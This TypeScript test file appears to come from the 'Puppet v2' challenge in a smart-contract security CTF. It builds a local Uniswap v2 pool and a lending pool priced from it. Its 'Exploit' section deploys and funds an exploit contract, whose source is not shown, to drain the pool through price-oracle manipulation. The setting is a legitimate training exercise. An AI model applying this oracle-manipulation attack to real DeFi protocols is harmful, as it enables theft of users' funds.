import * as pairJson from "@uniswap/v2-core/build/UniswapV2Pair.json";
import * as factoryJson from "@uniswap/v2-core/build/UniswapV2Factory.json";
import * as routerJson from "@uniswap/v2-periphery/build/UniswapV2Router02.json";

import { ethers } from 'hardhat';
import { expect } from 'chai';
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { DamnValuableToken, PuppetV2Pool, WETH9 } from "../../typechain";
import { Contract } from "@ethersproject/contracts";

describe('[Challenge] Puppet v2', function () {
    let deployer: SignerWithAddress, attacker: SignerWithAddress;
    let token: DamnValuableToken, weth: WETH9, uniswapFactory: Contract, uniswapRouter: Contract, uniswapExchange: Contract, lendingPool: PuppetV2Pool;
    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('100');
    const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('10000');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x1158e460913d00000", // 20 ETH
        ]);
        expect(await ethers.provider.getBalance(attacker.address)).to.eq(ethers.utils.parseEther('20'));

        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
        const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);

        // Deploy tokens to be traded
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
        uniswapRouter = await UniswapRouterFactory.deploy(
            uniswapFactory.address,
            weth.address
        );

        // Create Uniswap pair against WETH and add liquidity
        await token.approve(
            uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapRouter.addLiquidityETH(
            token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        uniswapExchange = await UniswapPairFactory.attach(
            await uniswapFactory.getPair(token.address, weth.address)
        );
        expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt('0');

        // Deploy the lending pool
        lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
            weth.address,
            token.address,
            uniswapExchange.address,
            uniswapFactory.address
        );

        // Setup initial token balances of pool and attacker account
        await token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        expect(
            await lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('0.3'));
        expect(
            await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(ethers.utils.parseEther('300000'));
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        const EXPLOITER = await ethers.getContractFactory("PuppetV2PoolExploit");
        const _exploiter = await EXPLOITER.connect(attacker).deploy(lendingPool.address, token.address, uniswapRouter.address);

        await token.connect(attacker).transfer(_exploiter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await attacker.sendTransaction({ to: _exploiter.address, value: ethers.utils.parseEther("19.8") });

        await _exploiter.work(POOL_INITIAL_TOKEN_BALANCE);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await token.balanceOf(lendingPool.address)
        ).to.be.eq('0');

        expect(
            await token.balanceOf(attacker.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
    });
});